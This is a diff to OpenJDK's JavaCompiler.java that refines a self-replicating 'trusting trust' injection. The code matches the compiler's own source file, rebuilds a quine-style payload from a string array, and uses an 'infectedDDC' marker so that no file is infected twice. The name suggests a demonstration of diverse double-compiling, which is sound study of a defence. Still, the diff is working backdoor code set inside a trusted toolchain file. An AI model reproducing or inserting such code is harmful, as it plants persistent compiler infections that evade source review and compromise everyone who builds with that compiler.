@@ -639,13 +639,16 @@ public class JavaCompiler {
         char q = 34;
         char n = 10;
         String rep = "";
-        String ddc_target = "private JCCompilationUnit parse(JavaFileObject " + "filename, CharSequence content, boolean silent) {";
+        String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
+        ddc_target += "filename, CharSequence content, boolean silent) {";
         String[] l = {
             """
             int infectedDDC=1;
             char q = 34;
             char n = 10;
             String rep = "";
+            String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
+            ddc_target += "filename, CharSequence content, boolean silent) {";
             String[] l = {""",
             """
             };
@@ -668,14 +671,15 @@ public class JavaCompiler {
             }""",
         };
 
-        /* Target own file for insertion, if the file does not match path, continue compilation as normal. */
+        /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file twice. */
         String content_str = content.toString();
         if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java") ||
             content_str.indexOf("infectedDDC=1") != -1) {
+            System.out.println("Did not match target file or were already infected:");
             System.out.println(filename.getName());
-            System.out.println("Did not match target file.");
         } else {
-            System.out.println("Matched target injection file.");
+            System.out.println("Matched target injection file:");
+            System.out.println(filename.getName());
 
             rep += l[0];
             for (int i = 0; i < l.length; i++) {
